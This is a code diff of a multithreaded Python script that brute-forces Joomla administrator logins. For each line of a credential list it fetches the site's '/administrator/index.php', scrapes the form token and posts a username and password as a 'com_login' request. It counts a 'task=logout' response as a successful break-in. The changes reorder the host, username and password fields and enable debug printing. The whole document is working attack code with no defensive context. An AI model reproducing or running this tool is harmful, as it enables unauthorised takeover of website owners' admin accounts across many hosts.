@@ -20,7 +20,8 @@ source_file = "source.txt"
 theard_count = 100
 def brut(string):
     t = string.split()
-    url = 'http://'+t[2]+'/administrator/index.php'
+    url = 'http://'+t[3]+'/administrator/index.php'
+    print(url)
     s = requests.Session()
     try:    
         response = s.get(url, headers=headers, timeout = 30)
@@ -30,7 +31,7 @@ def brut(string):
     try:
         parsed = lxml.html.fromstring(response.text)
         links = parsed.xpath("//input[@value]")
-        #print(links)
+        print(links)
         list = []
         for i in links:
             #print(i.attrib['value'])
@@ -70,8 +71,8 @@ def brut(string):
         except:
             print('Error parsing url')
     payload = {
-        'username':t[0],
-        'passwd':t[1],
+        'username':t[1],
+        'passwd':t[2],
         'option': 'com_login',
         'task': 'login',
         'return':retur, 
@@ -86,7 +87,7 @@ def brut(string):
     '''if s.text.find('action=lostpassword')>0:action=logout
         return False
     else:'''
-    response = s.get('http://'+t[2]+'/administrator/index.php', headers=headers, timeout = 10)
+    response = s.get('http://'+t[3]+'/administrator/index.php', headers=headers, timeout = 10)
     #if response.status_code == 200:
     if response.text.find('task=logout')>0:
         return True
